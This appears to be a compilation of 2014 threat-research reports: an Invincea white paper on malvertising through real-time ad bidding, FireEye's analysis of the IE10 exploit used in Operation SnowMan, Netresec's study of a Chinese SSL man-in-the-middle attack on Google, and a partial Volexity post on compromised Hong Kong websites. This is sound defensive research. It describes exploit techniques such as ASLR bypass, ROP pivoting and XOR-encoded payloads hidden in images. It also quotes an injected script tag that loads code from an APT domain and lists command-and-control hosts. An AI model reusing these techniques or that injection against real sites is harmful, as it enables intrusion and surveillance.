        complex, taking into account everything from very detailed behavioral profiles to conversion data.The following infographic summarizes how advanced adversaries are now micro-targeting companies
using malvertising.Invincea, Inc.                                                           Release Date: 10.27.2014
                         Invincea White Paper   15




Invincea, Inc.   Release Date: 10.27.2014
                                                                                      Invincea White Paper        16



Malvertisers have Weaponized RTB


The marketplace and auction of ads sounds great for actual ads.But what if the landing pages that are
supposed to be ads are actually malicious PHP pages with embedded malware?The bidding and ad
placements work the same, but instead of seeing a flashy ad banner, the highest bidder for the placement
serves malware.The price to win the bid to push malvertising to any page you happen to visit ranges from
45 to 75 cents per impression.A malicious advertiser on a network may serve crafted, seemingly normal ads, a majority of the time.In
fact, the ads are often stolen copies from legitimate advertisers.This establishes the attacker’s legitimacy
and trust on the ad network.Of course with real-time ad bidding, he can simply offer up low bids and his
content would consistently lose in the marketplace.But it is very simple to replace the redirection code
to switch from a legitimate ad banner to a drop site that hosts an exploit kit, typically based on Java, Flash,
Silverlight, or all three.Once the malvertiser detects that he has several infected hosts, he removes the
redirection code and goes back to serving standard ad banners.He then “burns” his temporary exploit kit
drop site, moving his exploits to another location for a new campaign.This allows the malicious advertiser to perform hit and run attacks, infect whomever he wants at whatever
time he wants, and maintain his presence on the advertising marketplace without drawing undue
attention to his activities.In the sections below, we will provide highlights of the RTB industry, its targeting capabilities, and show
how malvertisers have been mis-appropriating RTB networks to deliver malware.Competitive Service Offerings for RTB


The RTB ad networks provide significant micro-targeting capabilities that have long been used to serve
legitimate content to users more likely to click on them.In the following, we describe these capabilities
to show the state of the art in RTB network capabilities.The quoted material below are direct quotes from
Real Time Bidding service providers linked.Emphasis added by Invincea.Pubmatic:


        Audience Targeting: Bid on the audiences most valuable to you.Each impression in the PubMatic
        auction can be enhanced with first- and third-party data; giving buyers targeting capabilities
        across display, mobile, tablet and video inventory.Media buyers can also cookie sync with
        publisher audiences to incorporate CRM, retargeting and exclusion strategies in their digital
        advertising.Buyers have access to proprietary audience segments either directly through Private Marketplace
        deals or through the open market.With hundreds of parameters available to you, PubMatic has
        your best audiences waiting for you.Invincea, Inc.                                                              Release Date: 10.27.2014
                                                                                    Invincea White Paper       17


        With PubMatic, buyers are able to access pre-defined vertical or audience packages, seasonal
        packages, publisher and/or site-specific inventory packages as well as pre-selected publisher
        packages and pricing available in Private Marketplaces.First-Impression.com


        “First-Impression Buy-Side offers the granular targeting, tracking, and reporting needed to help
        our clients make the most of their spend, along with an expert support team to advise when
        needed.By leveraging real time buying, First-Impression Buy-Side gives media buyers the full
        control to maximize the value of an impression.”

Could Malvertisers Track Exploits and their cost per impression?Yes.Many RTB networks provide a
control panel to track advertising campaigns in real-time, along with notifications that bids have been won
and who exactly was served the malware.Below is a URL redirection log from First-Impression.com from a winning bid by a malvertiser.In the URL
are parameters such as the type of ad, the type of user-agent string of the ad reader specified (which
discloses browser and java versions), whether it is a retargeted ad based off of cookies (this one was not),
the price paid, which is 65.4 cents, and the notification to the malvertiser that his malvertising was
delivered.Since they specialize in
knowing the location of their ad windows, they market those ad spaces to the actual advertisers and
malvertisers, along with targeted demographics about the content pages, the visitors to the sites and
more.To showcase the variety of impression-level data available to buyers, consider the data made
        available through a connection to DoubleClick Ad Exchange’s real-time bidding API.With ADX, a
        buyer could consider any of the following data passed from the seller with each impression:

        • Ad slot parameters: visibility (above or below the fold), size, excluded creative attributes,
        excluded advertiser URLs, allowed vendor or ad technology.• Geo parameters: country, region, metro, city.• Content parameters: site URL, site language, seller network, vertical or category.Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                      Invincea White Paper        18


        • User parameters: browser, operating system, anonymous cookie (hashed), cookie age.Just like when considering one type of data, by using the anonymous cookie parameter, buyers
        can consider first-party retargeting or third-party audience data from a data provider.However,
        they can go further in the evaluation by looking at more of these parameters.This helps a buyer
        learn much more about a particular user and a particular impression, gain a smarter answer to
        the three essential questions and make a more data-driven decision.Twitter, Facebook and other RTB ads can now target mobile devices by their phone
           numbers.This sounds like a great way to advertise if you are in the marketing industry.Consider how granularly a
person can be targeted if this service is used maliciously.If not targeted by the desktop, how about on
the mobile platform?Twitter’s Tailored Audiences just got a little more tailored.Advertisers can now augment their customer data using mobile advertising IDs and mobile
        phone numbers as a way to reach existing customers and increase audience size.In essence, the
        move is an extension of Twitter’s Tailored Audiences for CRM retargeting, which allows advertisers
        to use hashed non-PII email address to retarget existing customers.(email addresses are twitter
        IDs- so you could be targeted for ad delivery based on your account name or known phone
        number)

        Twitter also rolled out the ability to target lookalike audiences, a function that seems pretty similar
        to Facebook’s tool of the same name.Twitter’s lookalike modeling uses a proprietary algorithm
        that examines modeled users looking for similarities related to behaviors, interests, location,
        demographic attributes and engagement patterns.Twitter described its enhanced as “part of improved targeting options to help advertisers reach
        additional users similar to their existing audiences.”

        Tailored Audiences, Twitter’s seeming answer to the Facebook Exchange (FBX), officially launched
        back in December after running retargeting and database matching tests in July.Twitter has
        appeared to follow Facebook’s lead with a number of its recent roll-outs, including site retargeting,
        CRM targeting and now retargeting via lookalike audiences.(Facebook also makes it possible to
        target users by phone numbers through Custom Audiences.)Neustar.biz


Neustar does provide a real-time bidding ad exchange, but their real market is IP intelligence that they
sell to other advertising networks for the purposes of better targeting specific users.In Europe, laws
require that advertising networks allow people to opt out of having tracking cookies, which is how many
advertisers used to rely upon for ad campaign targeting.To get around this, Neustar perfected IP based
targeting, which avoids cookies.They are able to build IP specific browsing profiles based on IP subnets.In a blog post below, Neustar boasts about their direct to IP range and enterprise advertising.Invincea, Inc.                                                              Release Date: 10.27.2014
                                                                                     Invincea White Paper       19


        How can Neustar IP Intelligence target by IP?While IP intelligence has been around for many years, the ability to effectively target advertising
        by audience, based on IP is very new.Neustar IP Intelligence is currently working with select DSP
        platforms to buy impressions off of the exchanges based on the IP address rather than cookies.This has only been possible with the recent emergence of real time bidding (RTB).The secret
        sauce is in understanding the IP and the methodology necessary for targeting ads appropriately
        against it.Is an IP Address like a cookie?No, an IP address only identifies devices on a network.The IP address does not contain any PII and
        does not track or store any consumer usage or behavioral information.(But IP ranges are
        registered by IANA, and you can easily know who owns the ranges)

        Product Specific Questions
        Q1: How does the process work?The process works exactly like any advertising network.Instead of buying inventory based on a
        cookie, Neustar is buying inventory based on an IP address.We run the targeting specifics against
        our proprietary database and create a custom IP list to target against.Neustar has set up
        relationships with partners that have built the functionality for this to work end-to-end for our
        advertisers.Neustar offers a full service ad network.Brand marketers who wish to advertise using IP Audience
        Targeting can work directly with Neustar to determine custom IP placements, run campaigns,
        optimization, reporting and billing.Much like any traditional online publisher or online ad network,
        Neustar manages the entire process.How does Neustar deliver its ads?We use industry standard methods for delivering our ads, but what makes our approach special is
        that we bake in the IP data before delivering the inventory with our network partners, which
        allows us to target display ad campaigns to a specific business or organization.We obtain
        inventory from ad exchanges, but have our own ad server.Zedo


Zedo, blamed for recent malvertising via DoubleClick, say they are now trying to protect against
malvertisers in this blog here.Less than a week after this announcement, they published another blog
post that describes how they can push advertising to specific platforms, devices, as well as specific markets
and networks:

        ZEDO Advertising Technology Updates – September 2014

        Device Targeting
        Users can now target ads to a specific device when trafficking ads.An option for “Device
        Targeting” is now available under “Targeting”.A creative targeted to a specific Device will serve
        only on that Device.All major manufacturers/models are supported by this feature.If a creative is
        not targeted to any specific device than it will serve on all device.Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                 Invincea White Paper      20




        Figure 13: Targeting by Device Manufacturer/Model

        Apart from device, a user can target various devices based on different categories.At any given
        point of time, a user can target multiple manufacturers and categories.Figure 14: Targeting by Device Category

        Reach Report by Creative
        Apart from existing campaign reach report a user can now pull a reach report by creative.The
        creative reach report is available along with all the existing parameters and can be pulled by
        month, week or day.Creative reach report will show creative wise reach.It will help to analyze
        how effective the reach of a creative was.Major Players in RTB



Invincea, Inc.                                                         Release Date: 10.27.2014
                                                                                     Invincea White Paper        21




To be clear, RTB networks are legitimate platforms for displaying ads on ad-supported websites.They
enable micro-targeting of user’s interest, delivering content that a viewer would likely want to see.As we
have detailed here, they can also be mis-appropriated unwittingly by malvertisers using these same tools
and techniques to target companies with malware for persistent remote access in addition to traditional
click fraud, phishing, and identity theft.Below are links to RTB providers to learn more.http://www.sovrn.com/
http://www.turn.com/
http://indexexchange.com/
https://www.dataxu.com/
http://www.sitescout.com/rtb/
http://first-impression.com/home/
http://www.zedo.com/



How Malvertisers Get $$ to Bid on RTB

Invincea has shown logs from a winning malvertising bid in the price range of 65 cents per impression.That is one ad, on one page, paid for by the malvertiser’s account.This implies that malvertisers have
deep pockets, spending hundreds of dollars on ad impressions.So how do they get money to spend on
these malicious campaigns?Invincea recently saw a malvertiser win a bid and delivered a Java exploit.This exploit copied a fully
functional version of Chrome into the Java cache directory, and that version of Chrome launched in the
background and proceeded to visit websites and click on specific ad banners.It is presumed that these
ad banners paid revenue via referral bonuses to the malvertiser.By paying 65 cents to install a
background web browser that does nothing but click fraud, the malvertiser is able to reap hundreds if not
thousands of dollars in advertising referral income.It is a pretty good return on investment, which in turn
allows the malvertiser to fund his micro-targeted malvertising attack campaign.It is ironic, however, that click fraud is what is driving the prices of RTB advertising so high.Malvertising
is not only a danger to end users, but it is a danger to the advertising industry as well.The image from
Figure 14 below shows a log file of Chrome, in this instance, renamed Oajvliewxpge.exe, injected via Java
to run in the background.Invincea detected this attack and killed the infection attempt.This is one
instance where the malvertiser wasted his 65 cents.Invincea, Inc.                                                              Release Date: 10.27.2014
                                                                                     Invincea White Paper       22




Figure 16: Event tree of click fraud malvertising exploit

It should be noted that Invincea is uniquely capable of stopping this type of attack.The introduction of
Chrome as a browser, which is whitelisted by hash across the AV industry, would go unchecked by the AV
and whitelisting applications industry.In this instance, the host was almost converted to a click-fraud bot.But the malware delivery could have been intended for data exfiltration, banking Trojans, or any other
more insidious purpose.Where Malvertisers Host Exploits


The ability for advertisers and malvertisers to automatically redirect to self-hosted ad content or exploit
pages is driving RTB malvertising.The malvertiser creates the
redirection in his normal ad prior to raising his bids to winning levels.Once several victims are confirmed,
those malicious landing pages have the content erased, and the automatic redirection removed to serve
“normal” ads again.Real World Examples of RTB Malvertising Captured by Invincea

Figures 17 through 21 in the following are screenshots from Invincea’s Threat Management console from
various RTB-based malvertising incidents with highlighted URLs for malvertising delivered via RTB ad
bidding.Figure 17: Recent Blaze.Com RTB Kryptik malvertising via GumGum




Figure 18: Online Ammunition Forum had RTB malvertising delivered.Exploit landing page in
In.ua.Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                        Invincea White Paper   24




Figure 19: Largest Trading Online Forum Trade2Win.com delivered RTB malvertising via
German provider:




Figure 20: Answers.com click bait articles hosted winning RTB bids dropping Kryptik from
Polish government landing page exploit kits.Invincea, Inc.                                                  Release Date: 10.27.2014
                                                                      Invincea White Paper   25




Figure 21: Online Poker Room and targeted RTB attack against Defense Contractor.Java
exploit hosted at unconfigured Nginx host.Invincea, Inc.                                                Release Date: 10.27.2014
                                                                                    Invincea White Paper       26



Ransomware Campaign via Malvertising


In September and October of 2014, Invincea saw a sharp spike of malvertising delivering CryptoWall
ransomware attacks via Real Time Ad Bidding.We observed Real Time Ad bidding platforms, including
OpenX, GoogleAds, Yahoo, AOL, and first-impression.com, fall victim to the ransomware malvertising
scheme by unwittingly delivering the CryptoWall 2.0 ransomware ads.Ransomware is a particularly pernicious form of malware that fully encrypts the victim’s disk and data
files, including remote storage, then demands payment of anywhere from $300 to $1000 in return for the
decryption key.Users are held hostage from their own work, pictures, personal, and proprietary material.To learn more about the scourage of ransomware, see this blog.Based on analysis of Invincea logs in would-be victims targeted by these ads, we have insight into the
attacker that is delivering the malicious ads.According to Invincea analysis of ads delivered from first-
impression.com, winning ad bids ranging from as low as 30 cents and as high as $1.70, were delivered by
a block of unique identifiers.It is highly likely that the same attackers are using other RTB ad platforms.This campaign matches the characteristics described by Proofpoint in its blog in terms of the exploitation
methods.Legitimate ad copy is stolen, 3rd party ad networks used to distribute malware, and popular ad-
supported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web
exploits.Merely visiting any ad-supported site may result in a CryptoWall ransomware infection.Cryptowall 2.0 utilizes the TOR network to hide its communications, but it quickly encrypts all local files
on the disk, and demands bitcoin payment to unlock the files.Many companies have fallen prey to this
attack over the past few months, making this one of the most successful Ransomware campaigns to date.Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                 Invincea White Paper    27



Analysis of CryptoWall Malvertising Infections

Mitigated Infection Event Sports.Yahoo.com

Below is a typical Cryptowall 2 infection as seen in the Invincea Management Server logs.This winning
ad placement ran on sports.yahoo.com – an Alexa Top 4 rated site.Highlighted in order in Figure 22 is
the common filename of obupdat.exe, which has ever changing hashes, followed by the TOR port, and
the 3rd party ad platform of first-impression.com.Analysis (Original report):




                              Figure 22: CryptoWall 2.0 infection report




Invincea, Inc.                                                          Release Date: 10.27.2014
                                                                                Invincea White Paper    28


Timeline Analysis (Original Report):

Below in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall.Figure 23: Network connections from CryptoWall 2.0




Invincea, Inc.                                                         Release Date: 10.27.2014
                                                                                  Invincea White Paper     29


In addition, you can see the ransom note being written to disk on an infected machine in the audit logs
in Figure 24.Figure 24: File writes including the ransom note from CryptoWall infection

Figure 25 shows the winning malvertising bid via RTB ad delivery from first-impression.com.Items
highlighted in the URL below is userid, and the winning bid price to place malvertising of Cryptowall on
sports.yahoo.com, which is 60 cents.It is likely they were not aware without ad
screening technology.In each event above, Invincea blocked an attempt to infect an endpoint with Cryptowall 2.0 and
prevented CryptoWall from encrypting the user’s file system and holding it hostage.Had the user not
been running Invincea, the attack would likely have been successful, and the only way the user would
have had to recover the encrypted files would be to pay the attacker the ransom.This is an effective
ransom technique, and one that is paying off well for the attackers, who use the income from the
attacks to purchase Real Time Ad Bids on RTB networks to infect more users.Central Hosting of Clean Content




Most RTB ad providers allow for advertisers to host their own ad content.This allows advertisers to
directly collect web impression data of who is hitting which ads, from where, by which IPs, which user-
agent strings, and just about anything else you could log about a website visit.In addition, the advertising
network doesn’t have to utilize their own disk space to host the image files, the flash videos or other
online content.RTB networks simply do the auctioneering and redirection to the winning content.Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                   Invincea White Paper       31


It is this weakness in security that malvertisers are taking advantage of.If ad networks were to switch to
a model where all content is actually hosted by them (1st party hosting), in a cloud, then the risk of
malvertising would drop dramatically.The RubiconProject has a Seller’s Cloud, which could be a security model for the RTB industry.It is
inherently more secure way of hosting ad content.How to Protect Yourself from Micro-targeted Malvertising

Operation DeathClick is an active campaign to micro-target companies via malvertising in order to
compromise their networks.Unfortunately, the micro-targeting malvertising technique evades almost all
network controls and traditional endpoint anti-virus solutions.Invincea can protect users from this attack
type among other targeted and opportunistic web-based threats.For half the price of a candy bar,
attackers have the unprecedented ability to deliver malware to you through your web browser simply
because of your IP address space and your industry vertical.Most of the attacks featured here were not
detected by standard Anti-Virus because the malware hashes constantly change.Web proxy blocking updates, even in real time, will not stop new malvertising landing pages that appear
and disappear within minutes.Intelligence feeds from the premier intelligence providers, based on hostname, IP, URL or domain will not
be able to block malicious malvertisers quickly enough.Invincea protected users can simply browse and click anything online without fear of compromise or
targeted malvertising attacks.Non-Invincea users can attempt to OptOut of directed targeting where you can.European privacy laws
for forcing most ad providers to offer the opt-out service; however, you often have to visit each ad
provider individually to choose to opt out.Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper       32


Note, that opting out merely places a blocking cookie in your browser.This means that ad providers will
not target or retarget based on cookies.But as shown above, the new targeted advertising is via IP
intelligence.http://www.rubiconproject.com/privacy/consumer-online-profile-and-opt-out/
http://preferences-mgr.truste.com/
http://www.ghosteryenterprise.com/global-opt-out/



Release Notes


10/27: For clarification, Invincea has added additional notes in this version that the websites shown here
and the 3rd party real-time ad networks are being used unwittingly and their resources misappropriated
by malvertisers to target companies for persistent remote access, click fraud, and other nefarious
activities.This is not a reflection on these companies, nor the services they provide.This paper
highlights the problem for greater awareness so the industry collectively can combat this problem
perhaps with more effective screening at the source prior to displaying ads.Invincea, Inc.                                                           Release Date: 10.27.2014Operation SnowMan: DeputyDog Actor Compromises US Veterans of
Foreign Wars Website
On February 11, FireEye identified a zero-day exploit (CVE-2014-0322) being served up from the U.S.
Veterans of Foreign Wars’ website (vfw[.]org).We believe the attack is a strategic Web compromise
targeting American military personnel amid a paralyzing snowstorm at the U.S. Capitol in the days leading
up to the Presidents Day holiday weekend.Based on infrastructure overlaps and tradecraft similarities, we
believe the actors behind this campaign are associated with two previously identified campaigns
(Operation DeputyDog and Operation Ephemeral Hydra).This blog post examines the vulnerability and associated attacks, which we have dubbed “Operation
SnowMan.”




Exploit/Delivery analysis

After compromising the VFW website, the attackers added an iframe into the beginning of the website’s
HTML code that loads the attacker’s page in the background.The attacker’s HTML/JavaScript page runs a
Flash object, which orchestrates the remainder of the exploit.The exploit includes calling back to the IE 10
vulnerability trigger, which is embedded in the JavaScript.Specifically, visitors to the VFW website were
silently redirected through an iframe to the exploit at www.[REDACTED].com/Data/img/img.html.Mitigation

The exploit targets IE 10 with Adobe Flash.It aborts exploitation if the user is browsing with a different
version of IE or has installed Microsoft’s Experience Mitigation Toolkit (EMET).So installing EMET or
updating to IE 11 prevents this exploit from functioning.Vulnerability analysis

The vulnerability is a previously unknown use-after-free bug in Microsoft Internet Explorer 10.The
vulnerability allows the attacker to modify one byte of memory at an arbitrary address.The attacker uses
the vulnerability to do the following:

      Gain access to memory from Flash ActionScript, bypassing address space layout randomization
      (ASLR)
      Pivot to a return-oriented programing (ROP) exploit technique to bypass data execution prevention
      (DEP)
EMET detection

The attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file
path to the EMET DLL.Then the exploit code parses the error resulting from the XML load order to
determine whether the load failed because the EMET DLL is not present.The exploit proceeds only if this
check determines that the EMET DLL is not present.ASLR bypass

Because the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use
it to bypass ASLR.For example, the attacker corrupts a Flash Vector object and then accesses the
corrupted object from within Flash to access memory.We have discussed this technique and other ASLR
bypass approaches in our blog.One minor difference between the previous approaches and this attack is
the heap spray address, which was changed to 0x1a1b2000 in this exploit.Code execution

Once the attacker’s code has full memory access through the corrupted Flash Vector object, the code
searches through loaded libraries gadgets by machine code.The attacker then overwrites the vftable
pointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP.After successful
exploitation, the code repairs the corrupted Flash Vector and flash.Media.Sound to continue execution.Shellcode analysis

Subsequently, the malicious Flash code downloads a file containing the dropped malware payload.The
beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR
key of 0×95.The attacker appends the payload to the shellcode before pivoting to code control.Then,
when the shellcode is executed, the malware creates files “sqlrenew.txt” and “stream.exe”.The tail of the
image file is decoded, and written to these files.“sqlrenew.txt” is then executed with the LoadLibraryA
Windows API call.ZxShell payload analysis

As documented above, this exploit dropped an XOR (0×95) payload that executed a ZxShell backdoor
(MD5: 8455bbb9a210ce603a1b646b0d951bce).The compile date of the payload was 2014-02-11, and the
last modified date of the exploit code was also 2014-02-11.This suggests that this instantiation of the
exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of
Foreign Wars website.A possible objective in the SnowMan attack is targeting military service members to
steal military intelligence.In addition to retirees, active military personnel use the VFW website.It is
probably no coincidence that Monday, Feb. 17, is a U.S. holiday, and much of the U.S. Capitol shut down
Thursday amid a severe winter storm.The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to
cyber espionage operations.This particular variant called back to a command and control server located at
newss[.]effers[.]com.This domain currently resolves to 118.99.60.142.The domain info[.]flnet[.]org also
resolved to this IP address on 2014-02-12.Infrastructure analysis

The info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous
resolutions to the following IP addresses:

      58.64.200.178
      58.64.200.179
      103.20.192.4

First Seen       Last Seen         CnC Domain           IP
2013-08-31       2013-08-31        icybin.flnet[.]org   58.64.200.178
2013-05-02       2013-08-02        info.flnet[.]org     58.64.200.178
2013-08-02       2013-08-02        book.flnet[.]org     58.64.200.178
2013-08-10       2013-08-10        info.flnet[.]org     58.64.200.179
2013-07-15       2013-07-15        icybin.flnet[.]org   58.64.200.179
2014-01-02       2014-01-02        book.flnet[.]org     103.20.192.4
2013-12-03       2014-01-02        info.flnet[.]org     103.20.192.4

We previously observed Gh0stRat samples with the custom packet flag “HTTPS” calling back to
book[.]flnet[.]org and icybin[.]flnet[.]org.The threat actor responsible for Operation DeputyDog also
used the “HTTPS” version of the Gh0st.We also observed another “HTTPS” Gh0st variant connecting to
a related command and control server at me[.]scieron[.]com.MD5 Hash                         CnC Domain
758886e58f9ea2ff22b57cbbb015166e book.flnet[.]org
0294f9280491f85d898ebe471f0fb58e icybin.flnet[.]org
9d20566a327076b7152bbf9ed20292c4 me.scieron[.]com

The me[.]scieron[.]com domain previously resolved to 58.64.199.22.The book[.]flnet[.]org domain also
resolved to another IP in the same subnet 58.64.199.0/24.Specifically, book[.]flnet[.]org previously
resolved to 58.64.199.27.Others domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org, ali[.]blankchair[.]com,
and cht[.]blankchair[.]com.The domain dll[.]freshdns[.]org resolved to 58.64.199.25.Both
ali[.]blankchair[.]com and cht[.]blankchair[.]com resolved to 58.64.199.22.First Seen       Last Seen         CnC Domain             IP
2012-11-12       2012-11-28        me.scieron[.]com     58.64.199.22
2012-04-09       2012-10-24        cht.blankchair[.]com 58.64.199.22
2012-04-09       2012-09-18        ali.blankchair[.]com 58.64.199.22
2012-11-08       2012-11-25        dll.freshdns[.]org   58.64.199.25
2012-11-23       2012-11-27        rt.blankchair[.]com 58.64.199.25
2012-05-29       2012-6-28         book.flnet[.]org     58.64.199.27

A number of other related domains resolve to these IPs and other IPs also in this /24 subnet.For the
purposes of this blog, we’ve chosen to focus on those domains and IP that relate to the previously
discussed DeputyDog and Ephemeral Hydra campaigns.You may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked
to both Operation DeputyDog and Operation Ephemeral Hydra.Figure 1 illustrates the
infrastructure overlaps and connections we observed between the strategic Web compromise campaign
leveraging the VFW’s website, the DeputyDog, and the Ephemeral Hydra operations.At a high level, this attack and the CVE-
2013-3163 attack both leveraged a Flash file that orchestrated the exploit, and would call back into IE
JavaScript to trigger an IE flaw.The code within the Flash files from each attack are extremely similar.They build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have
some identical functions with common typos, and even share the same name.This entry was posted in Advanced Malware, Exploits, Targeted Attack, Threat Research, Vulnerabilities
and tagged 0day, zero-day by Darien Kindlund, Dan Caselden, Xiaobo Chen, Ned Moran and Mike Scott.Bookmark the permalink.Analysis of Chinese MITM on Google

Thursday, 04 September 2014 23:55:00 (UTC/GMT)

The Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and
Google.We've performed technical analysis of the attack, on request from GreatFire.org, and can
confirm that it is a real SSL MITM against www.google.com and that it is being performed from within
China.We were contacted by GreatFire.org yesterday (September 3) with a request to analyze two packet
captures from suspected MITM-attacks before they finalized their blog post.The conclusions from our
analysis is now published as part of GreatFire.org's great blog post titled “Authorities launch man-in-the-
middle attack on Google”.In their blog post GreatFire.org write:

From August 28, 2014 reports appeared on Weibo and Google Plus that users in China trying to
access google.com and google.com.hk via CERNET, the country’s education network, were
receiving warning messages about invalid SSL certificates.The evidence, which we include later
in this post, indicates that this was caused by a man-in-the-middle attack.While the authorities have been blocking access to most things Google since June 4th, they have
kept their hands off of CERNET, China’s nationwide education and research network.However,
in the lead up to the new school year, the Chinese authorities launched a man-in-the-middle
(MITM) attack against Google.We do not disclose the client IP addresses for privacy reasons, but they both
seem legit; one from Peking University (netname PKU6-CERNET2) and the other from Chongqing

University (CQU6-CERNET2).Both IP addresses belong to AS23910, named "China Next Generation
Internet CERNET2".Peking University entrance, by galaygobi (Creative Commons Attribution 2.0)

Chongqing University gate, by Brooktse (Creative Commons Attribution-Share Alike 3.0)

The IP addresses received for www.google.com were in both cases also legit, so the MITM wasn't carried
out through DNS spoofing.The Peking University client connected to 2607:f8b0:4007:804::1013

(GOOGLE-IPV6 in United States) and the connection from Chongqing University went to
2404:6800:4005:805::1010 (GOOGLE_IPV6_AP-20080930 in Australia).Time-To-Live (TTL) Analysis

The Time-To-Live (TTL) values received in the IP packets from www.google.com were in both cases 248 or
249 (note: TTL is actually called ”Hop Limit” in IPv6 nomenclature, but we prefer to use the well
established term ”TTL” anyway).The highest possible TTL value is 255, this means that the received
packets haven't made more than 6 or 7 router hops before ending up at the client.However, the expected
number of router hops between a server on GOOGLE-IPV6 and the client at Peking University is around
14.The low number of router hops is is a clear indication of an IP MITM taking place.This network is actually part of
CERNET, but on AS23911, which is the network that connects CERNET with its external peers.A
reasonable assumption is therefore that the MITM is carried out on the 2001:252::/32 network, or where
AS23910 (2001:da8:1::2) connects to AS23911 (2001:252:0:1::1).This means that the MITM attack is
being conducted from within China.Response Time Analysis

The round-trip time between the client and server can be estimated by measuring the time from when the
client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server.The expected
round-trip time for connecting from CERNET to a Google server overseas would be around 150ms or
more.However, in the captures we've analyzed the TCP SYN+ACK package was received in just 8ms
(Peking) and 52ms (Chongqing) respectively.Again, this is a clear indication of an IP MITM taking place,
since Google cannot possibly send a response from the US to CERNET within 8ms regardless of how fast
they are.The fast response times also indicate that the machine performing the MITM is located fairly
close to the network at Peking University.Even though the machine performing the MITM was very quick at performing the TCP tree-way
handshake we noticed that the application layer communication was terribly slow.The specification for
the TLS handshake (RFC 2246) defines that a ClientHello message should be responded to with a
ServerHello.Google typically send their ServerHello response almost instantly, i.e.the response is
received after one round-trip time (150ms in this case).However, in the analyzed captures we noticed
ServerHello response times of around 500ms.X.509 Certificate analysis

We extracted the X.509 certificates from the two capture files to .cer files using NetworkMiner.We
noticed that both users received identical certificates, which were both self signed for “google.com”.The

fact that the MITM used a self signed certificate makes the attack easily detectable even for the non-
technical user, since the web browser will typically display a warning about the site not being trusted.Additionally the X.509 certificate was created for ”google.com” rather than ”*.google.com”.This is an
obvious miss from the MITM'ers side since they were attempting to MITM traffic to ”www.google.com”
but not to ”google.com”.NetworkMiner showing list of X.509 certificates extracted from the two PCAP files

Certificate SHA1 fingerprint: f6beadb9bc02e0a152d71c318739cdecfc1c085d
Certificate MD5 fingerprint: 66:D5:D5:6A:E9:28:51:7C:03:53:C5:E1:33:14:A8:3B

A copy of the fake certificate is available on Google drive thanks to GreatFire.org.Conclusions

All evidence indicates that a MITM attack is being conducted against traffic between China’s nationwide
education and research network CERNET and www.google.com.It looks as if the MITM is carried out on a
network belonging to AS23911, which is the outer part of CERNET that peers with all external networks.This network is located in China, so we can conclude that the MITM was being done within the country.It's difficult to say exactly how the MITM attack was carried out, but we can dismiss DNS spoofing as the
used method.The evidence we've observed instead indicate that the MITM attack is performed either by
performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent
SSL proxy.An alternative to changing the router config would also be to add an in-line device that
redirects the desired traffic to the SSL proxy.However, regardless of how they did it the attacker would be

able to decrypt and inspect the traffic going to Google.We can also conclude that the method used to perform the MITM attack was similar to the Chinese MITM
on GitHub, but not identical.Share  |  

   

   

 Short URL: http://netresec.com/?b=14955CB

Posted by Erik Hjelmvik on Thursday, 04 September 2014 23:55:00 (UTC/GMT)Democracy in Hong Kong Under Attack
Posted on October 9, 2014 by Steven Adair
Over the last few months, Volexity has been tracking a particularly remarkable advanced persistent threat (APT) operation
involving strategic web compromises of websites in Hong Kong and Japan.In both countries, the compromised websites have been
particularly notable for their relevance to current events and the high profile nature of the organizations involved.In particular the
Hong Kong compromises appear to come on the heels of the Occupy Central Campaign shifting into high gear.These
compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the
impacted websites.This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install
malware on their systems.While investigating these cases, Volexity also discovered additional APT attack campaigns involving
multiple other pro-democratic websites in Hong Kong.These attempts at exploitation, compromise, and digital surveillance are
detailed throughout this post.Compromised Pro-Democratic Hong Kong Websites
Warning: Many of these websites may still be compromised and present a risk to visitors.Browse with caution.Alliance for True Democracy â€“ Hong Kong
Over the last two days, Volexity has observed malicious code being served up from the website of the Alliance for True Democracy
(ATD) in Hong Kong (www.atd.hk).ATD is an alliance of people and organizations dedicated to democracy and universal suffrage
in Hong Kong.At the time of this writing malicious code is still live on the website, so please visit with care until the website is
clean.Below is a screen shot of the malicious code references found pre-pended to a JavaScript file on the website named
superfish.js.This JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and
interpeted as:

<script language=javascript src=http://java-se.com/o.js</script>

The domain name java-se.com is known bad and associated with APT activity.At the time of this post, the domain is hosted on the
Japanese IP address 210.253.101.105.7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.

Volexity has yet to actually see the contents of the file o.js, as the websites has continuously returned HTTP 403 responses each
time it was requested.The file was requested from IP addresses throughout Asia without ever returning valid content.Itâ€™s
unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets.This
same code has also been observed being served from another Hong Kong website described in the next section.Webshell Backdoor
While examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it.This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises.Volexity refers to this shell as the Angel Webshell, named after its default password of â€œangelâ€​.The shell will simply display
the text â€œPassword:â€​, a text input box, and a Login button.A screen shot of the webshell as observed on the ATD website can

be seen below.Despite the shell being written in PHP and only displaying a simple Login prompt, it is easy to identify the Angel webshell based on
unique components of its viewable HTML source code.The HTML source of this page is displayed in the following image.While Volexity operates under the assumption attackers have placed webshells on webservers they have compromised, in this
